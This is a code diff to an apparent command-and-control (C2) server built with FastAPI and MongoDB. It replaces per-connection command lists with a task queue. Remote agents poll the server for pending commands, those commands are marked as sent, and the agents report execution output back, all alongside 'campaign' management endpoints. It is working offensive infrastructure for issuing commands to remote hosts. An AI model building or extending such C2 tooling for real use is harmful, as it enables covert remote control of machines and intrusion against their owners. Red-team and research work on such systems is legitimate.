@@ -11,6 +11,7 @@ client = MongoClient("mongodb://localhost:27017/")
 db = client["database"]
 connections = db["connections"]
 campaigns = db["campaigns"]
+tasks = db["tasks"]
 
 # ----------------------------------------------------------------------------------------------
 # API endpoints to interact with the command and control service
@@ -79,44 +80,79 @@ async def unregister_connection(connection_id: str):
 async def add_command(connection_id: str, request: Request):
     data = await request.json()
 
-    # Add the command to the connection's list of commands
-    connections.update_one({"_id": ObjectId(connection_id)}, {"$push": {"commands": data}}, upsert=True)
+    # Add the timestamp to the command
+    data['timestamp'] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-    return {'message': 'Command added successfully', 'connection_id': connection_id}
+    # add the command to the task list with the connection ID as an additional field to be able to identify the agent
+    data['connection_id'] = connection_id
+
+    # add the command as input to the task list
+    data['input'] = data['command']
+
+    # set the status of the command to pending
+    data['status'] = 'pending'
+
+    task_id = tasks.insert_one(data).inserted_id
+
+    return {'message': 'Command added successfully', 'task_id': str(task_id)}
 
 # return the new commands for the client from the database based on the connection ID
 @app.get('/c2/get-commands/{connection_id}')
 async def get_commands(connection_id: str):
-    # Retrieve the connection from MongoDB
-    connection = connections.find_one({"_id": ObjectId(connection_id)})
-    if not connection:
-        return HTMLResponse(content="Connection not found", status_code=404)
+    # retrieve all tasks for the connection ID with the status 'pending'
+    task_list = []
+    for task in tasks.find({"connection_id": connection_id, "status": "pending"}):
+        task['_id'] = str(task['_id'])
+        task_list.append(task)
+    
+    # set the status of the tasks to 'sent' to prevent the client from receiving the same tasks again
+    tasks.update_many({"connection_id": connection_id, "status": "pending"}, {"$set": {"status": "sent"}})
 
-    # edit the commands to be returned to the client in the following format: command1; command2; command3 etc.
-    # and only return the commands and not the id or the timestamp
-    commands = connection['commands']
-    for command in commands:
-        command.pop('_id')
-    commands = "; ".join(commands)
+    print("Task list: " + str(task_list))
 
-    # clear the commands from the database
-    connections.update_one({"_id": ObjectId(connection_id)}, {"$set": {"commands": []}})
+    # send the task list to the client
+    return {'task_list': task_list}
 
-    # Return the connection's list of commands
-    return {'commands': commands}
+
+    # # Retrieve the connection from MongoDB
+    # connection = connections.find_one({"_id": ObjectId(connection_id)})
+    # if not connection:
+    #     return HTMLResponse(content="Connection not found", status_code=404)
+
+    # # edit the commands to be returned to the client in the following format: command1; command2; command3 etc.
+    # # and only return the commands and not the id or the timestamp
+    # commands = connection['commands']
+    # for command in commands:
+    #     command.pop('_id')
+    # commands = "; ".join(commands)
+
+    # # clear the commands from the database
+    # connections.update_one({"_id": ObjectId(connection_id)}, {"$set": {"commands": []}})
+
+    # # Return the connection's list of commands
+    # return {'commands': commands}
 
 # get a list of all commands for one connection from the database to be displayed in the web interface
 @app.get('/c2/get-command-list/{connection_id}')
 async def get_command_list(connection_id: str):
-    # Retrieve the connection from MongoDB
-    connection = connections.find_one({"_id": ObjectId(connection_id)})
-    if not connection:
-        return HTMLResponse(content="Connection not found", status_code=404)
+    # Retrieve the task list from MongoDB
+    task_list = []
+    for task in tasks.find({"connection_id": connection_id}):
+        task['_id'] = str(task['_id'])
+        task_list.append(task)
 
-    commands = connection['commands']
+    # Return the task list
+    return {'task_list': task_list}
 
-    # Return the connection's list of commands
-    return {'commands': commands}
+    # # Retrieve the connection from MongoDB
+    # connection = connections.find_one({"_id": ObjectId(connection_id)})
+    # if not connection:
+    #     return HTMLResponse(content="Connection not found", status_code=404)
+
+    # commands = connection['commands']
+
+    # # Return the connection's list of commands
+    # return {'commands': commands}
 
 # get the command output for one connection from the database
 @app.get('/c2/get-command-output/{connection_id}')
@@ -130,19 +166,30 @@ async def get_command_output(connection_id: str):
     return {'command_output': connection['command_output']}
 
 # add the command output to the database
-@app.post('/c2/add-command-output/{connection_id}')
-async def add_command_output(connection_id: str, request: Request):
-    output = await request.body()
-    data = {}
-    data['output'] = output
+@app.post('/c2/add-command-output/{connection_id}/{task_id}')
+async def add_command_output(connection_id: str, task_id: str, request: Request):
+    data = await request.json()
 
     # Add the timestamp to the command output
-    data['timestamp'] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-    # Add the command output to the connection's list of command output
-    connections.update_one({"_id": ObjectId(connection_id)}, {"$push": {"command_output": data}})
+    # add the task output to the task
+    tasks.update_one({"_id": ObjectId(task_id)}, {"$set": {"output": data['output'], "timestamp": timestamp, "status": "completed"}})
 
-    return {'message': 'Command output added successfully', 'connection_id': connection_id}
+    # return message
+    return {'message': 'Command output added successfully', 'connection_id': connection_id, 'task_id': task_id}
+
+    # output = await request.body()
+    # data = {}
+    # data['output'] = output
+
+    # # Add the timestamp to the command output
+    # data['timestamp'] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+    # # Add the command output to the connection's list of command output
+    # connections.update_one({"_id": ObjectId(connection_id)}, {"$push": {"command_output": data}})
+
+    # return {'message': 'Command output added successfully', 'connection_id': connection_id}
 
 # ----------------------------------------------------------------------------------------------
 # API endpoints to interact with the campaign management service
